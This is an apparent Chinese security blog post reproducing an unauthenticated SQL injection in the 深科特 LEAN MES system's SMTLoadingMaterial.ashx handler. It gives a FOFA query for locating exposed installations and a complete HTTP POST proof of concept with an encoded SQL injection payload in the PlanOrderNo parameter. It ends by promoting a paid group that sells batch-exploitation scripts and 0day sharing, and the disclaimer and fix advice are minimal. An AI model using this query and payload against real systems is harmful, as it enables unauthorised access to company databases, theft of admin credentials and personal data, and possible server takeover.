#  「漏洞复现」深科特 LEAN MES系统 SMTLoadingMaterial.ashx SQL注入漏洞   
冷漠安全  冷漠安全   2025-01-07 13:32  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
0x01 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
产品介绍  
  
深科特LEAN MES精益制造执行系统集成生产过程管理、智能仓储管理、智能排程管理、品质管理、 供应商信息管理、设备夹具管理、SCADA 数据采集与监控、BI 与大数据等核心功能模块，通过强调制造过程的信息化和透明化，帮助企业由粗放式向精益化管理模式升级。LEAN MES精益制造执行系统采用前沿互联网技术进行开发，纯B/S跨平台云架构可以使用浏览器随时随地一键访问，无需安装客户端，节省80%的IT维护工作量和50%硬件投资成本；软硬件接口灵活，轻松打通WMS、ERP、SRM、PDM、PLM、CRM、HR、OA等系统间的数据壁垒；并可以实现与电子制造、机械加工、注塑冲压行业的制造设备进行对接，进行数据采集、数据分析、设备效率OEE自动计算等。LEAN MES精益制造执行系统通过强调制造过程的整体优化来帮助制造企业实施全面的数字化管控。  
  
0x03  
  
漏洞威胁  
  
深科特LEAN MES系统  SMTLoadingMaterial.ashx 接口存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。  
  
0x04  
  
漏洞环境  
  
FOFA:  
```
(title="LEAN MES - 用户登录" || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png")
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oWBa7ZYW4RdJx3ucNqqWhX3WYw1miaHicrLYjKhUaCt0CZIH7ArNHc7cPuicpC884voYADSa3Zry6Zg/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
漏洞复现  
  
PoC  
```
POST /handler/SMTLoadingMaterial.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Connection: keep-alive

type=GetOrderList&PlanOrderNo=1%27+AND+9304+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%289304%3D9304%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29--+keHv
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oWBa7ZYW4RdJx3ucNqqWhXgIDhY2bniby3KsRzbXxqDwSBBX37WFmkygeYzu75YFOLN9iaMzGQ5zPw/640?wx_fmt=png&from=appmsg "")  
  
0x06  
  
批量脚本验证  
  
Nuclei验证脚本已发布  
  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oWBa7ZYW4RdJx3ucNqqWhXgjQJEhib34I7fUmzRXIvSIqWDQUlYr0QzV7XdrMjthWb5ial0bCueJNw/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
修复建议  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
加入我们  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全  
  
交个朋友，限时优惠券：加入立减25  
  
星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oWBa7ZYW4RdJx3ucNqqWhXkaa6OPUKVVkc3sojKWpttomsu450HEfrNLsG9spyYiasPMn5xeUxw3g/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0oWBa7ZYW4RdJx3ucNqqWhXZ74vVmcB2fcYhKOxgQpYuN1hIoLIqicchKL8vcxBJyJ4XmBSRJ7mk0A/640?wx_fmt=gif&from=appmsg "")  
  
  
